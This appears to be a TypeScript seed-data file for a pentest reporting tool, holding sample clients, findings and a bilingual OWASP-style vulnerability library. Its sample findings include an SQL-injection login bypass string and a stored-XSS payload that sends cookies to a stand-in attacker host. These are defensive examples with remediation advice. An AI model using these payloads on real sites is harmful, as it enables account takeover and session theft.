

import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';
import { format } from 'date-fns';

export const clients: Client[] = [
  { id: 'cli-1', name: 'Innovatech Solutions', contact: 'contact@innovatech.com', logoUrl: 'https://picsum.photos/seed/innovatech/128/128' },
  { id: 'cli-2', name: 'Quantum Dynamics', contact: 'security@quantum.com', logoUrl: 'https://picsum.photos/seed/quantum/128/128' },
  { id: 'cli-3', name: 'SecureBank Corp', contact: 'audit@securebank.com', logoUrl: 'https://picsum.photos/seed/securebank/128/128' },
  { id: 'cli-4', name: 'HealthFirst Providers', contact: 'compliance@healthfirst.com', logoUrl: 'https://picsum.photos/seed/healthfirst/128/128' },
];

export const projects: Project[] = [
  { 
    id: 'proj-1', 
    clientId: 'cli-1', 
    name: 'Q3 Web App Pentest', 
    reportBody: `## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.innovatech.com, api.innovatech.com
- **External Network:** 198.51.100.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

## Attack Narrative
The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-07-01', 
    endDate: '2023-07-15', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-07-01T10:00:00Z', 
    updatedAt: '2023-07-15T18:00:00Z', 
    icon: 'Scan' 
  },
  { 
    id: 'proj-2', 
    clientId: 'cli-2', 
    name: 'Análisis de Red Interna', 
    reportBody: '', 
    startDate: '2023-08-10', 
    endDate: '2023-08-20', 
    status: 'In Progress', 
    language: 'es', 
    createdAt: '2023-08-10T09:00:00Z', 
    updatedAt: '2023-08-15T14:30:00Z', 
    icon: 'Network' 
  },
];

export const findings: Finding[] = [
  { 
    id: 'find-1', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-A03', 
    title: 'SQL Injection on Login Form', 
    severity: 'Critical', 
    cvss: 9.8, 
    markdown: `### Overview
A critical SQL Injection vulnerability was identified in the main login form of the application. This flaw allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application, potentially with administrative privileges.

### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

### Affected Components
- \`/auth/login\` endpoint
- User authentication module

### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full compromise of the application, data exfiltration, and further attacks against the underlying infrastructure.

### Recommendations
Implement parameterized queries (prepared statements) to handle all user-supplied input in database queries. This is the most effective way to prevent SQL Injection attacks. Validate and sanitize all user input on the server side as a defense-in-depth measure.`, 
    createdAt: '2023-07-05T11:00:00Z', 
    updatedAt: '2023-07-10T15:00:00Z' 
  },
  { 
    id: 'find-2', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-web-002', 
    title: 'Stored Cross-Site Scripting (XSS) in User Profile', 
    severity: 'High', 
    cvss: 8.0, 
    markdown: `### Overview
A stored XSS vulnerability exists in the user profile section, allowing an attacker to inject malicious scripts that execute in the browsers of other users, including administrators.

### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

### Recommendations
Implement context-aware output encoding for all user-supplied data before it is rendered in the browser. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.`, 
    createdAt: '2023-07-06T14:00:00Z', 
    updatedAt: '2023-07-11T10:00:00Z' 
  },
];

const emptyVulnBoilerplate = {
  remediation_en: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  remediation_es: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
};

export const vulnerabilities: Vulnerability[] = [
    // Web
    {
        id: "vuln-web-001",
        title_en: "SQL Injection",
        title_es: "Inyección SQL",
        cwe: "CWE-89",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nSQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.\n\n---\n\n### Impact\nThis might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.",
        overview_es: "### Resumen\nLa inyección SQL es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación hace a su base de datos. Generalmente, permite a un atacante ver datos que normalmente no podría recuperar.\n\n---\n\n### Impacto\nEsto podría incluir datos pertenecientes a otros usuarios o cualquier otro dato al que la propia aplicación pueda acceder. En muchos casos, un atacante puede modificar o eliminar estos datos, provocando cambios persistentes en el contenido o el comportamiento de la aplicación.",
        references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
        tags: ["Web", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-002",
        title_en: "Cross-Site Scripting (XSS)",
        title_es: "Secuencias de Comandos en Sitios Cruzados (XSS)",
        cwe: "CWE-79",
        severity: "High",
        cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.\n\n---\n\n### Impact\nFlaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.",
        overview_es: "### Resumen\nLos ataques de Cross-Site Scripting (XSS) son un tipo de inyección, en la que se inyectan scripts maliciosos en sitios web que de otro modo serían benignos y confiables. Los ataques XSS ocurren cuando un atacante utiliza una aplicación web para enviar código malicioso, generalmente en forma de un script del lado del navegador, a un usuario final diferente.\n\n---\n\n### Impacto\nLas fallas que permiten que estos ataques tengan éxito están bastante extendidas y ocurren en cualquier lugar donde una aplicación web utiliza la entrada de un usuario dentro de la salida que genera sin validarla o codificarla. Un atacante puede usar XSS para enviar un script malicioso a un usuario desprevenido. El navegador del usuario final no tiene forma de saber que no se debe confiar en el script y lo ejecutará. Debido a que cree que el script proviene de una fuente confiable, el script malicioso puede acceder a cualquier cookie, token de sesión u otra información confidencial retenida por el navegador y utilizada con ese sitio.",
        references: ["https://owasp.org/www-community/attacks/xss/"],
        tags: ["Web", "XSS"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-003",
        title_en: "Broken Authentication",
        title_es: "Autenticación Rota",
        cwe: "CWE-287",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nApplication functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.\n\n---\n\n### Impact\nAttackers may be able to gain control over user accounts in the system, and depending on the privileges of the compromised account, they may be able to compromise the entire system.",
        overview_es: "### Resumen\nLas funciones de la aplicación relacionadas con la autenticación y la gestión de sesiones a menudo se implementan incorrectamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión, o explotar otras fallas de implementación para asumir las identidades de otros usuarios de forma temporal o permanente.\n\n---\n\n### Impacto\nLos atacantes pueden obtener el control de las cuentas de usuario en el sistema y, dependiendo de los privilegios de la cuenta comprometida, pueden comprometer todo el sistema.",
        references: ["https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication"],
        tags: ["Web", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-004",
        title_en: "Sensitive Data Exposure",
        title_es: "Exposición de Datos Sensibles",
        cwe: "CWE-312",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nMany web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.\n\n---\n\n### Impact\nSensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser. Sensitive data exposure can result in significant reputational damage and regulatory fines.",
        overview_es: "### Resumen\nMuchas aplicaciones web y API no protegen adecuadamente los datos sensibles, como los financieros, de atención médica y PII. Los atacantes pueden robar o modificar dichos datos débilmente protegidos para cometer fraudes con tarjetas de crédito, robo de identidad u otros delitos.\n\n---\n\n### Impacto\nLos datos sensibles merecen una protección adicional, como el cifrado en reposo o en tránsito, así como precauciones especiales cuando se intercambian con el navegador. La exposición de datos sensibles puede resultar en un daño reputacional significativo y multas regulatorias.",
        references: ["https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"],
        tags: ["Web", "Data"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-005",
        title_en: "XML External Entities (XXE)",
        title_es: "Entidades Externas XML (XXE)",
        cwe: "CWE-611",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nMany older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.\n\n---\n\n### Impact\nXXE can lead to the disclosure of confidential data, denial of service, server-side request forgery (SSRF), port scanning from the perspective of the machine where the parser is located, and other system impacts.",
        overview_es: "### Resumen\nMuchos procesadores XML antiguos o mal configurados evalúan las referencias a entidades externas dentro de los documentos XML. Las entidades externas se pueden usar para divulgar archivos internos utilizando el controlador de URI de archivo, recursos compartidos de archivos internos, escaneo de puertos internos, ejecución remota de código y ataques de denegación de servicio.\n\n---\n\n### Impacto\nXXE puede conducir a la divulgación de datos confidenciales, denegación de servicio, falsificación de solicitudes del lado del servidor (SSRF), escaneo de puertos desde la perspectiva de la máquina donde se encuentra el analizador y otros impactos en el sistema.",
        references: ["https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)"],
        tags: ["Web", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-006",
        title_en: "Broken Access Control",
        title_es: "Control de Acceso Roto",
        cwe: "CWE-284",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" },
        overview_en: "### Summary\nRestrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access other users' accounts, view sensitive files, or use privileged functions.\n\n---\n\n### Impact\nBroken access control can lead to unauthorized information disclosure, modification or destruction of data, or performing a business function outside the user's limits.",
        overview_es: "### Resumen\nLas restricciones sobre lo que los usuarios autenticados pueden hacer a menudo no se aplican correctamente. Los atacantes pueden explotar estas fallas para acceder a las cuentas de otros usuarios, ver archivos confidenciales o usar funciones privilegiadas.\n\n---\n\n### Impacto\nUn control de acceso roto puede conducir a la divulgación de información no autorizada, la modificación o destrucción de datos, o la realización de una función comercial fuera de los límites del usuario.",
        references: ["https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"],
        tags: ["Web", "Access Control"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-007",
        title_en: "Security Misconfiguration",
        title_es: "Configuración Insegura",
        cwe: "CWE-16",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nSecurity misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.\n\n---\n\n### Impact\nNot only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched and upgraded in a timely fashion. This can lead to unauthorized access or knowledge of the system, which can result in a full system compromise.",
        overview_es: "### Resumen\nLa configuración incorrecta de seguridad es el problema más común. Esto suele ser el resultado de configuraciones predeterminadas inseguras, configuraciones incompletas o ad hoc, almacenamiento en la nube abierto, encabezados HTTP mal configurados y mensajes de error detallados que contienen información confidencial.\n\n---\n\n### Impacto\nNo solo todos los sistemas operativos, marcos, bibliotecas y aplicaciones deben configurarse de forma segura, sino que también deben ser parcheados y actualizados de manera oportuna. Esto puede conducir a un acceso no autorizado o al conocimiento del sistema, lo que puede resultar en un compromiso total del sistema.",
        references: ["https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"],
        tags: ["Web", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-008",
        title_en: "Cross-Site Request Forgery (CSRF)",
        title_es: "Falsificación de Solicitudes en Sitios Cruzados (CSRF)",
        cwe: "CWE-352",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nA CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.\n\n---\n\n### Impact\nCSRF can result in state-changing requests being performed on behalf of the victim, such as changing their password or email address, or making financial transactions.",
        overview_es: "### Resumen\nUn ataque CSRF obliga al navegador de una víctima que ha iniciado sesión a enviar una solicitud HTTP falsificada, incluida la cookie de sesión de la víctima y cualquier otra información de autenticación incluida automáticamente, a una aplicación web vulnerable. Esto permite al atacante forzar al navegador de la víctima a generar solicitudes que la aplicación vulnerable cree que son solicitudes legítimas de la víctima.\n\n---\n\n### Impacto\nCSRF puede resultar en la realización de solicitudes que cambian el estado en nombre de la víctima, como cambiar su contraseña o dirección de correo electrónico, o realizar transacciones financieras.",
        references: ["https://owasp.org/www-community/attacks/csrf"],
        tags: ["Web", "Session"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-009",
        title_en: "Insecure Deserialization",
        title_es: "Deserialización Insegura",
        cwe: "CWE-502",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nInsecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.\n\n---\n\n### Impact\nThe impact of deserialization flaws can be severe, because they can lead to remote code execution. It's also possible for these flaws to be used for other attacks, such as denial-of-service, access control bypass, and so on.",
        overview_es: "### Resumen\nLa deserialización insegura a menudo conduce a la ejecución remota de código. Incluso si las fallas de deserialización no dan como resultado la ejecución remota de código, se pueden usar para realizar ataques, incluidos ataques de repetición, ataques de inyección y ataques de escalada de privilegios.\n\n---\n\n### Impacto\nEl impacto de las fallas de deserialización puede ser grave, porque pueden conducir a la ejecución remota de código. También es posible que estas fallas se utilicen para otros ataques, como denegación de servicio, omisión del control de acceso, etc.",
        references: ["https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization"],
        tags: ["Web", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-010",
        title_en: "Server-Side Request Forgery (SSRF)",
        title_es: "Falsificación de Solicitudes del Lado del Servidor (SSRF)",
        cwe: "CWE-918",
        severity: "High",
        cvss: { score: 9.0, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "L", availability: "N" },
        overview_en: "### Summary\nSSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to a surprising destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).\n\n---\n\n### Impact\nSSRF can result in information disclosure (e.g., reading local files, cloud metadata), internal network scanning, and interaction with internal services that are not directly accessible from the internet.",
        overview_es: "### Resumen\nLas fallas de SSRF ocurren cada vez que una aplicación web obtiene un recurso remoto sin validar la URL proporcionada por el usuario. Permite que un atacante fuerce a la aplicación a enviar una solicitud diseñada a un destino sorprendente, incluso cuando está protegido por un firewall, VPN u otro tipo de lista de control de acceso a la red (ACL).\n\n---\n\n### Impacto\nSSRF puede resultar en la divulgación de información (p. ej., lectura de archivos locales, metadatos en la nube), escaneo de la red interna e interacción con servicios internos que no son directamente accesibles desde Internet.",
        references: ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
        tags: ["Web", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-011",
        title_en: "HTTP Verb Tampering",
        title_es: "Manipulación de Verbos HTTP",
        cwe: "CWE-284",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nSome web servers or application frameworks may have different access control rules for different HTTP verbs (e.g., GET, POST, PUT, DELETE). An attacker might be able to bypass access control by sending a request with an unexpected HTTP verb, such as using GET instead of POST to access a privileged function.\n\n---\n\n### Impact\nThis can lead to unauthorized access to functionalities, information disclosure, or modification of data.",
        overview_es: "### Resumen\nAlgunos servidores web o marcos de aplicaciones pueden tener diferentes reglas de control de acceso para diferentes verbos HTTP (por ejemplo, GET, POST, PUT, DELETE). Un atacante podría eludir el control de acceso enviando una solicitud con un verbo HTTP inesperado, como usar GET en lugar de POST para acceder a una función privilegiada.\n\n---\n\n### Impacto\nEsto puede conducir a un acceso no autorizado a funcionalidades, divulgación de información o modificación de datos.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Verb_Tampering"],
        tags: ["Web", "Access Control"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-012",
        title_en: "Local File Inclusion (LFI)",
        title_es: "Inclusión de Archivos Locales (LFI)",
        cwe: "CWE-98",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nLocal File Inclusion (LFI) is a type of vulnerability that allows an attacker to include a file, usually exploiting a 'dynamic file inclusion' mechanism implemented in the web application. The vulnerability occurs due to the use of user-supplied input without proper validation.\n\n---\n\n### Impact\nAn attacker can use LFI to read sensitive files on the server, such as configuration files, source code, or system files like `/etc/passwd`. In some cases, LFI can lead to remote code execution.",
        overview_es: "### Resumen\nLa Inclusión Local de Archivos (LFI) es un tipo de vulnerabilidad que permite a un atacante incluir un archivo, generalmente explotando un mecanismo de 'inclusión dinámica de archivos' implementado en la aplicación web. La vulnerabilidad ocurre debido al uso de la entrada proporcionada por el usuario sin una validación adecuada.\n\n---\n\n### Impacto\nUn atacante puede usar LFI para leer archivos sensibles en el servidor, como archivos de configuración, código fuente o archivos de sistema como `/etc/passwd`. En algunos casos, LFI puede conducir a la ejecución remota de código.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Local_File_Inclusion"],
        tags: ["Web", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-013",
        title_en: "SSRF to Local File Read",
        title_es: "SSRF para Lectura de Archivos Locales",
        cwe: "CWE-918",
        severity: "High",
        cvss: { score: 8.6, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nA specific variant of Server-Side Request Forgery where an attacker can abuse the functionality to read arbitrary files from the local file system by using the `file://` protocol handler in the supplied URL.\n\n---\n\n### Impact\nAllows an attacker to read sensitive files on the server, such as credentials, configuration files, or source code.",
        overview_es: "### Resumen\nUna variante específica de Falsificación de Solicitudes del Lado del Servidor donde un atacante puede abusar de la funcionalidad para leer archivos arbitrarios del sistema de archivos local utilizando el manejador de protocolo `file://` en la URL suministrada.\n\n---\n\n### Impacto\nPermite a un atacante leer archivos sensibles en el servidor, como credenciales, archivos de configuración o código fuente.",
        references: ["https://portswigger.net/web-security/ssrf"],
        tags: ["Web", "SSRF"],
        ...emptyVulnBoilerplate
    },

    // Mobile
    {
        id: "vuln-mob-014",
        title_en: "Insecure Data Storage",
        title_es: "Almacenamiento Inseguro de Datos",
        cwe: "CWE-922",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nThis category covers insecure data storage on the mobile device. This could be anything from user credentials to personal information to session data. An attacker with physical access to the device could potentially access this data.\n\n---\n\n### Impact\nAn attacker can gain access to sensitive information stored on the device, such as passwords, API keys, or personal user data.",
        overview_es: "### Resumen\nEsta categoría cubre el almacenamiento inseguro de datos en el dispositivo móvil. Esto podría ser cualquier cosa, desde credenciales de usuario hasta información personal o datos de sesión. Un atacante con acceso físico al dispositivo podría acceder a estos datos.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso a información sensible almacenada en el dispositivo, como contraseñas, claves de API o datos personales del usuario.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage"],
        tags: ["Mobile", "Data"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-015",
        title_en: "Weak Server-Side Controls",
        title_es: "Controles Débiles en el Servidor",
        cwe: "CWE-602",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nThis category is a catch-all for all the issues that are the result of a mobile application's server-side component. These are not mobile-specific vulnerabilities, but they are a major part of the mobile risk landscape.\n\n---\n\n### Impact\nImpacts are varied and can include data leakage, full account takeover, and server compromise, depending on the specific server-side flaw.",
        overview_es: "### Resumen\nEsta categoría es un cajón de sastre para todos los problemas que son el resultado del componente del lado del servidor de una aplicación móvil. Estas no son vulnerabilidades específicas de dispositivos móviles, pero son una parte importante del panorama de riesgos móviles.\n\n---\n\n### Impacto\nLos impactos son variados y pueden incluir fuga de datos, toma de control total de la cuenta y compromiso del servidor, dependiendo de la falla específica del lado del servidor.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m10-extraneous-functionality"],
        tags: ["Mobile", "API"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-016",
        title_en: "Insufficient Transport Layer Protection",
        title_es: "Protección Insuficiente de la Capa de Transporte",
        cwe: "CWE-319",
        severity: "Medium",
        cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nData is typically exchanged between the mobile app and the backend in a client-server fashion. If this data is not protected in transit, it can be intercepted by an attacker.\n\n---\n\n### Impact\nAn attacker can eavesdrop on the communication and steal sensitive information like session cookies or user credentials.",
        overview_es: "### Resumen\nLos datos se intercambian normalmente entre la aplicación móvil y el backend en un formato cliente-servidor. Si estos datos no están protegidos en tránsito, pueden ser interceptados por un atacante.\n\n---\n\n### Impacto\nUn atacante puede espiar la comunicación y robar información sensible como cookies de sesión o credenciales de usuario.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication"],
        tags: ["Mobile", "Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-017",
        title_en: "Unintended Data Leakage",
        title_es: "Filtración de Datos no Intencionada",
        cwe: "CWE-200",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        overview_en: "### Summary\nThis category covers all the ways that a mobile app can leak data to unintended parties. This could be through the file system, the network, or through inter-process communication.\n\n---\n\n### Impact\nSensitive information about the user, the device, or the application can be exposed to other applications on the device or to network observers.",
        overview_es: "### Resumen\nEsta categoría cubre todas las formas en que una aplicación móvil puede filtrar datos a partes no deseadas. Esto podría ser a través del sistema de archivos, la red o la comunicación entre procesos.\n\n---\n\n### Impacto\nLa información sensible sobre el usuario, el dispositivo o la aplicación puede quedar expuesta a otras aplicaciones en el dispositivo o a observadores de la red.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage"],
        tags: ["Mobile", "Data"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-018",
        title_en: "Poor Authorization",
        title_es: "Autorización Deficiente",
        cwe: "CWE-285",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
        overview_en: "### Summary\nThis is the mobile equivalent of broken access control. The mobile app may have a flawless authorization scheme on the device, but the server-side component may not. An attacker can bypass the client-side checks and access server-side resources directly.\n\n---\n\n### Impact\nAn attacker can perform actions on behalf of other users, or access data that they are not authorized to see.",
        overview_es: "### Resumen\nEste es el equivalente móvil del control de acceso roto. La aplicación móvil puede tener un esquema de autorización impecable en el dispositivo, pero el componente del lado del servidor puede que no. Un atacante puede eludir las comprobaciones del lado del cliente y acceder directamente a los recursos del lado del servidor.\n\n---\n\n### Impacto\nUn atacante puede realizar acciones en nombre de otros usuarios o acceder a datos que no está autorizado a ver.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication"],
        tags: ["Mobile", "Access Control"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-019",
        title_en: "Broken Cryptography",
        title_es: "Criptografía Rota",
        cwe: "CWE-327",
        severity: "High",
